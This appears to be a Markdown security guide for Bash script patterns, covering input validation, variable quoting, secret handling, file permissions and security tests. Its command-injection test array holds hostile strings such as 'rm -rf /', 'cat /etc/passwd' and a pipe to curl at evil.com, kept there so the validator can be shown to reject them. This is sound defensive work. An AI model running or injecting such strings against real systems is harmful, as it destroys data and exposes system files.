# Security Guidelines

> Essential security practices for Claude Code Builder patterns

## Security Overview

**Security Score: A+**
- No critical vulnerabilities detected
- Input validation implemented
- No hardcoded secrets
- Safe command execution

**Core Security Principles:**
1. **Input Validation**: Always validate user input
2. **No Dangerous Commands**: Avoid eval, exec, and command injection
3. **Secret Management**: Never hardcode sensitive data
4. **Least Privilege**: Use minimal required permissions

## Quick Security Check

```bash
# Run security scan
source patterns/security/security-basics.sh
basic_security_scan

# Check for common issues
grep -r "eval\|exec" patterns/
grep -r "password\|secret\|key.*=" patterns/
```

## Input Validation

### Validate All User Input

**✅ Safe Input Handling:**
```bash
# Always validate user input
validate_username() {
    local username="$1"
    
    # Check if provided
    [[ -n "$username" ]] || {
        log_error "Username is required"
        return 1
    }
    
    # Validate format
    if validate_input "$username" "^[a-zA-Z0-9_-]+$" 32; then
        log_info "Username is valid: $username"
        return 0
    else
        log_error "Invalid username format"
        return 1
    fi
}
```

**❌ Dangerous Input Handling:**
```bash
# Never do this - command injection risk
dangerous_function() {
    local user_input="$1"
    eval "$user_input"  # DANGEROUS!
}

# Or this - no validation
process_file() {
    local filename="$1"
    cat "$filename"  # Could be any file!
}
```

### Input Validation Patterns

**Username Validation:**
```bash
validate_username() {
    local username="$1"
    validate_input "$username" "^[a-zA-Z0-9_-]+$" 32
}
```

**Email Validation:**
```bash
validate_email() {
    local email="$1"
    validate_input "$email" "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$" 254
}
```

**File Path Validation:**
```bash
validate_filepath() {
    local filepath="$1"
    
    # Prevent directory traversal
    [[ "$filepath" == *".."* ]] && {
        log_error "Directory traversal attempt blocked"
        return 1
    }
    
    # Ensure within allowed directory
    [[ "$filepath" == "/allowed/path/"* ]] || {
        log_error "Path not in allowed directory"
        return 1
    }
    
    return 0
}
```

**URL Validation:**
```bash
validate_url() {
    local url="$1"
    validate_input "$url" "^https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(/.*)?$" 2048
}
```

## Command Injection Prevention

### Never Use eval or exec

**❌ Dangerous Commands:**
```bash
# NEVER do this
eval "$user_input"
exec "$user_command"
$user_variable  # Variable command execution
```

**✅ Safe Alternatives:**
```bash
# Use case statements for controlled execution
execute_safe_command() {
    local command="$1"
    
    case "$command" in
        "start")
            start_service
            ;;
        "stop")
            stop_service
            ;;
        "restart")
            stop_service && start_service
            ;;
        *)
            log_error "Unknown command: $command"
            return 1
            ;;
    esac
}
```

### Quote All Variables

**✅ Proper Variable Quoting:**
```bash
# Always quote variables
safe_function() {
    local user_file="$1"
    
    [[ -f "$user_file" ]] && cat "$user_file"
    grep "pattern" "$user_file"
    cp "$user_file" "backup/$user_file"
}
```

**❌ Unquoted Variables:**
```bash
# Dangerous - allows injection
unsafe_function() {
    local user_file="$1"
    
    [[ -f $user_file ]] && cat $user_file  # Unquoted!
    grep pattern $user_file              # Unquoted!
}
```

### Safe Command Construction

**✅ Safe Command Building:**
```bash
# Build commands safely
build_safe_command() {
    local action="$1"
    local target="$2"
    
    # Validate inputs first
    validate_input "$action" "^(start|stop|restart)$" 10 || return 1
    validate_input "$target" "^[a-zA-Z0-9_-]+$" 32 || return 1
    
    # Build command with validated inputs
    local cmd="systemctl $action $target"
    log_info "Executing: $cmd"
    $cmd
}
```

## Secret Management

### Never Hardcode Secrets

**❌ Hardcoded Secrets:**
```bash
# NEVER do this
API_KEY="abc123secret456"
DATABASE_PASSWORD="mypassword123"
ENCRYPTION_KEY="supersecretkey"
```

**✅ Environment-Based Secrets:**
```bash
# Load from environment or config
load_secrets() {
    API_KEY=$(get_config "API_KEY" ".env" "")
    [[ -n "$API_KEY" ]] || handle_error $LINENO "API_KEY is required"
    
    # Don't log the actual secret
    log_info "API key loaded (length: ${#API_KEY})"
    
    # Use readonly to prevent modification
    readonly API_KEY
}
```

### Secure Configuration Loading

**✅ Secure Config Pattern:**
```bash
# Secure configuration loading
load_secure_config() {
    local config_file="$1"
    
    # Check file permissions (should be 600)
    local perms
    perms=$(stat -c %a "$config_file" 2>/dev/null)
    [[ "$perms" == "600" ]] || {
        log_warn "Config file should have 600 permissions: $config_file"
    }
    
    # Load configuration
    local api_key
    api_key=$(get_config "API_KEY" "$config_file" "")
    
    # Validate secret format
    [[ ${#api_key} -ge 16 ]] || {
        log_error "API key appears too short"
        return 1
    }
    
    # Export without logging value
    export API_KEY="$api_key"
    log_info "Configuration loaded securely"
}
```

### Secret Detection Prevention

**Check for Accidentally Committed Secrets:**
```bash
# Security scan function
scan_for_secrets() {
    log_info "Scanning for potential secrets"
    
    # Common secret patterns
    local secret_patterns=(
        "password.*="
        "key.*="
        "secret.*="
        "token.*="
        "api[_-]key.*="
    )
    
    for pattern in "${secret_patterns[@]}"; do
        if grep -r -i "$pattern" . --exclude-dir=.git; then
            log_error "Potential secret found matching: $pattern"
            return 1
        fi
    done
    
    log_success "No secrets detected"
}
```

## File Security

### Safe File Operations

**✅ Secure File Handling:**
```bash
# Safe file operations
safe_file_operation() {
    local filepath="$1"
    local operation="$2"
    
    # Validate file path
    validate_filepath "$filepath" || return 1
    
    # Check file exists and is readable
    [[ -f "$filepath" ]] || {
        log_error "File not found: $filepath"
        return 1
    }
    
    [[ -r "$filepath" ]] || {
        log_error "File not readable: $filepath"
        return 1
    }
    
    # Perform operation
    case "$operation" in
        "read")
            cat "$filepath"
            ;;
        "backup")
            cp "$filepath" "${filepath}.backup"
            ;;
        *)
            log_error "Unknown operation: $operation"
            return 1
            ;;
    esac
}
```

### Secure Temporary Files

**✅ Secure Temp File Creation:**
```bash
# Create secure temporary files
create_secure_temp() {
    local temp_file
    temp_file=$(mktemp)
    
    # Set secure permissions (owner read/write only)
    chmod 600 "$temp_file"
    
    # Clean up on exit
    trap "rm -f '$temp_file'" EXIT
    
    echo "$temp_file"
}
```

### File Permission Management

**✅ Proper File Permissions:**
```bash
# Set secure file permissions
set_secure_permissions() {
    local config_file="$1"
    
    # Config files should be owner-only
    chmod 600 "$config_file"
    
    # Scripts should be executable by owner
    chmod 700 script.sh
    
    # Public files can be world-readable
    chmod 644 public_file.txt
    
    log_info "Secure permissions set"
}
```

## Network Security

### Safe HTTP Requests

**✅ Secure HTTP Requests:**
```bash
# Secure API calls
safe_api_call() {
    local endpoint="$1"
    local data="$2"
    
    # Validate URL
    validate_url "$endpoint" || return 1
    
    # Use HTTPS only
    [[ "$endpoint" == https://* ]] || {
        log_error "Only HTTPS URLs are allowed"
        return 1
    }
    
    # Make request with timeout
    curl --max-time 30 \
         --retry 3 \
         --fail \
         -H "Authorization: Bearer $API_KEY" \
         -H "Content-Type: application/json" \
         -d "$data" \
         "$endpoint"
}
```

### Certificate Validation

**✅ SSL Certificate Validation:**
```bash
# Don't disable certificate verification
safe_curl() {
    local url="$1"
    
    # Good: Verify certificates (default)
    curl "$url"
    
    # Bad: Skip certificate verification
    # curl -k "$url"  # NEVER use -k in production
}
```

## Logging Security

### Safe Logging Practices

**✅ Secure Logging:**
```bash
# Log safely without exposing secrets
log_user_action() {
    local username="$1"
    local action="$2"
    local api_key="$3"
    
    # Log action without exposing sensitive data
    log_info "User action: $username performed $action"
    
    # Don't log the API key directly
    log_info "API key used (length: ${#api_key})"
    
    # Don't do this:
    # log_info "API key: $api_key"  # DANGEROUS!
}
```

**✅ Sanitize Log Messages:**
```bash
# Sanitize potentially dangerous log content
safe_log() {
    local message="$1"
    
    # Remove common sensitive patterns
    message="${message//password=*/password=***}"
    message="${message//key=*/key=***}"
    message="${message//token=*/token=***}"
    
    log_info "$message"
}
```

## Error Handling Security

### Secure Error Messages

**✅ Safe Error Reporting:**
```bash
# Don't expose system information in errors
safe_error_handling() {
    local operation="$1"
    
    if ! perform_operation "$operation"; then
        # Good: Generic error message
        log_error "Operation failed: $operation"
        
        # Bad: Exposes system details
        # log_error "Failed to connect to database at 192.168.1.100:5432 with user admin"
    fi
}
```

### Information Disclosure Prevention

**✅ Prevent Information Leakage:**
```bash
# Don't reveal file system structure
check_file_secure() {
    local filename="$1"
    
    if [[ -f "$filename" ]]; then
        log_info "File processed successfully"
    else
        # Don't reveal if file exists or directory structure
        log_error "File processing failed"
        # Instead of: log_error "File not found: $filename"
    fi
}
```

## Security Automation

### Automated Security Checks

**Security Validation Pipeline:**
```bash
#!/bin/bash
# Automated security validation

run_security_pipeline() {
    log_info "Running security validation pipeline"
    
    # Step 1: Basic security scan
    basic_security_scan || {
        log_error "Basic security scan failed"
        return 1
    }
    
    # Step 2: Secret detection
    scan_for_secrets || {
        log_error "Secret detection failed"
        return 1
    }
    
    # Step 3: File permission check
    check_file_permissions || {
        log_error "File permission check failed"
        return 1
    }
    
    # Step 4: Input validation test
    test_input_validation || {
        log_error "Input validation test failed"
        return 1
    }
    
    log_success "Security validation completed successfully"
}
```

### Pre-commit Security Hooks

**Git Pre-commit Hook:**
```bash
#!/bin/bash
# .git/hooks/pre-commit

# Load security patterns
source patterns/security/security-basics.sh

# Run security checks before commit
if basic_security_scan; then
    log_success "Security checks passed"
    exit 0
else
    log_error "Security checks failed - commit blocked"
    exit 1
fi
```

## Security Testing

### Security Test Cases

**Input Validation Tests:**
```bash
# Test input validation
test_input_validation() {
    source patterns/security/security-basics.sh
    
    # Test valid input
    if validate_input "validuser" "^[a-zA-Z0-9_]+$" 32; then
        log_info "✅ Valid input accepted"
    else
        log_error "❌ Valid input rejected"
        return 1
    fi
    
    # Test invalid input (injection attempt)
    if validate_input "user; rm -rf /" "^[a-zA-Z0-9_]+$" 32; then
        log_error "❌ Invalid input accepted"
        return 1
    else
        log_info "✅ Invalid input rejected"
    fi
    
    # Test length limit
    local long_input=$(printf 'a%.0s' {1..100})
    if validate_input "$long_input" "^[a-zA-Z]+$" 50; then
        log_error "❌ Long input accepted"
        return 1
    else
        log_info "✅ Long input rejected"
    fi
    
    log_success "Input validation tests passed"
}
```

**Command Injection Tests:**
```bash
# Test for command injection vulnerabilities
test_command_injection() {
    # Test cases that should be blocked
    local injection_attempts=(
        "user; rm -rf /"
        "user && cat /etc/passwd"
        "user | curl evil.com"
        "user; shutdown -h now"
        "\$(rm -rf /)"
        "\`whoami\`"
    )
    
    for attempt in "${injection_attempts[@]}"; do
        if validate_input "$attempt" "^[a-zA-Z0-9_-]+$" 32; then
            log_error "❌ Injection attempt not blocked: $attempt"
            return 1
        else
            log_info "✅ Injection attempt blocked: ${attempt:0:20}..."
        fi
    done
    
    log_success "Command injection tests passed"
}
```

## Security Monitoring

### Security Event Logging

**Security Event Logger:**
```bash
# Log security events
log_security_event() {
    local event_type="$1"
    local description="$2"
    local severity="${3:-INFO}"
    
    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    local security_log="/var/log/security.log"
    
    # Format: timestamp|severity|event_type|description
    echo "$timestamp|$severity|$event_type|$description" >> "$security_log"
    
    # Also log to standard logging
    case "$severity" in
        "CRITICAL"|"HIGH")
            log_error "SECURITY: $event_type - $description"
            ;;
        "MEDIUM")
            log_warn "SECURITY: $event_type - $description"
            ;;
        *)
            log_info "SECURITY: $event_type - $description"
            ;;
    esac
}

# Usage examples
log_security_event "LOGIN_ATTEMPT" "User login successful" "INFO"
log_security_event "INJECTION_BLOCKED" "Command injection attempt blocked" "HIGH"
log_security_event "INVALID_INPUT" "Input validation failed" "MEDIUM"
```

## Security Checklist

### Development Security Checklist

- [ ] **Input Validation**
  - [ ] All user input validated
  - [ ] Length limits enforced
  - [ ] Format validation implemented
  - [ ] Injection attempts blocked

- [ ] **Command Security**
  - [ ] No eval or exec usage
  - [ ] All variables quoted
  - [ ] Command injection prevented
  - [ ] Safe command construction

- [ ] **Secret Management**
  - [ ] No hardcoded secrets
  - [ ] Environment-based configuration
  - [ ] Secure file permissions (600)
  - [ ] Secret detection scan passed

- [ ] **File Security**
  - [ ] Path validation implemented
  - [ ] Directory traversal prevented
  - [ ] Proper file permissions
  - [ ] Secure temporary files

- [ ] **Error Handling**
  - [ ] No information disclosure
  - [ ] Generic error messages
  - [ ] Secure logging practices
  - [ ] No stack traces in production

### Deployment Security Checklist

- [ ] **Security Scanning**
  - [ ] Basic security scan passed
  - [ ] No critical vulnerabilities
  - [ ] Secret detection clean
  - [ ] File permissions correct

- [ ] **Monitoring**
  - [ ] Security event logging enabled
  - [ ] Alerts configured
  - [ ] Log rotation setup
  - [ ] Monitoring dashboards

- [ ] **Access Control**
  - [ ] Principle of least privilege
  - [ ] Secure file permissions
  - [ ] Network access restricted
  - [ ] Authentication implemented

For additional security resources, see:
- [Troubleshooting Guide](TROUBLESHOOTING.md) for security issue resolution
- [Best Practices](BEST_PRACTICES.md) for secure coding practices
- [API Reference](API_REFERENCE.md) for security function documentation